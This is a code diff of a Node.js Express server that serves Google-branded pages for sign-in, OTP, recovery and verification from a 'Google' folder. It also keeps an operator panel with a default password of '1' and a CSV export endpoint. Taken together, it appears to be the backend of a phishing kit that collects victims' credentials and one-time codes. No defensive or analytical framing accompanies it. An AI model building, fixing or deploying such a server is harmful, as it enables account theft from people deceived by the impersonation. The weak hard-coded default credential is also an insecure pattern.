@@ -1,35 +1,14 @@
 const express = require('express');
 const cors    = require('cors');
 const crypto  = require('crypto');
+const path    = require('path');
+
 const PANEL_USER     = process.env.PANEL_USER  || 'astro';
 const PANEL_PASS     = process.env.PANEL_PASS  || '1';
 const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');
 const COOKIE_NAME    = 'pan_sess_v2';
 const app  = express();
 const PORT = process.env.PORT || 3000;
-const path = require('path');
-const fs = require('fs');
-
-app.use((req, res, next) => {
-  if (req.path.endsWith('.html')) {
-    const cleanPath = req.path.slice(0, -5) || '/';
-    return res.redirect(301, cleanPath);
-  }
-  next();
-});
-
-app.use((req, res, next) => {
-  const filePath = path.join(__dirname, 'Google', `${req.path}.html`);
-  fs.access(filePath, fs.constants.F_OK, (err) => {
-    if (!err) {
-      res.sendFile(filePath);
-    } else {
-      next();
-    }
-  });
-});
-
-app.use(express.static(path.join(__dirname, 'public')));
 
 console.log('ENV check:', { PANEL_USER, PANEL_PASS: '***' });
 
@@ -536,14 +515,17 @@ app.get('/api/export', (req, res) => {
   res.send(csv);
 });
 
-app.get('/',                   (req, res) => res.sendFile(__dirname + '/index.html'));
-app.get('/welcome.html',       (req, res) => res.sendFile(__dirname + '/welcome.html'));
-app.get('/otp.html',           (req, res) => res.sendFile(__dirname + '/otp.html'));
-app.get('/recovery.html',      (req, res) => res.sendFile(__dirname + '/recovery.html'));
-app.get('/verification.html',  (req, res) => res.sendFile(__dirname + '/verification.html'));
-app.get('/auth.html',          (req, res) => res.sendFile(__dirname + '/auth.html'));
-app.get('/verify.html',        (req, res) => res.sendFile(__dirname + '/verify.html'));
-app.use(express.static(__dirname));
+app.use(express.static(path.join(__dirname, 'Google')));
+
+const pages = ['welcome', 'otp', 'recovery', 'verification', 'auth', 'verify'];
+pages.forEach(page => {
+  app.get(`/${page}.html`, (req, res) => res.redirect(301, `/${page}`));
+});
+
+app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'Google', 'index.html')));
+pages.forEach(page => {
+  app.get(`/${page}`, (req, res) => res.sendFile(path.join(__dirname, 'Google', `${page}.html`)));
+});
 
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`Server running on port ${PORT}`);
